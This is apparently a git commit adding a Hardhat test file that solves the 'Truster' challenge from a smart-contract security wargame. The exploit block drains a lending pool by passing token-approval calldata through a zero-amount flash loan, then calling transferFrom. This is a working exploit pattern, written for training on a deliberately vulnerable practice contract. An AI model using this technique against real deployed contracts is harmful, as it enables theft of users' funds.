c0d124887dd6f98202de337d4cc9a287f35bb233
R-Krishnan21 <krishnamkr12357@gmail.com>
2022-11-24 21:57:53 +0530

    first commit

---
+++ test/truster/truster.challenge.js
@@ -0,0 +1,57 @@
+const { ethers } = require('hardhat');
+const { expect } = require('chai');
+
+describe('[Challenge] Truster', function () {
+    let deployer, attacker;
+
+    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
+
+    before(async function () {
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+        [deployer, attacker] = await ethers.getSigners();
+
+        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
+        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);
+
+        this.token = await DamnValuableToken.deploy();
+        this.pool = await TrusterLenderPool.deploy(this.token.address);
+
+        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
+
+        expect(
+            await this.token.balanceOf(this.pool.address)
+        ).to.equal(TOKENS_IN_POOL);
+
+        expect(
+            await this.token.balanceOf(attacker.address)
+        ).to.equal('0');
+    });
+
+    it('Exploit', async function () {
+        /** CODE YOUR EXPLOIT HERE  */
+        let abi = ['function approve(address spender, uint amount) returns (bool)',];
+        let iface = new ethers.utils.Interface(abi);
+        await this.pool.flashLoan(
+            0,
+            attacker.address,
+            this.token.address,
+            iface.encodeFunctionData('approve', [attacker.address, TOKENS_IN_POOL])
+        );
+        await this.token
+                .connect(attacker)
+                .transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
+    });
+
+    after(async function () {
+        /** SUCCESS CONDITIONS */
+
+        // Attacker has taken all tokens from the pool
+        expect(
+            await this.token.balanceOf(attacker.address)
+        ).to.equal(TOKENS_IN_POOL);
+        expect(
+            await this.token.balanceOf(this.pool.address)
+        ).to.equal('0');
+    });
+});
+
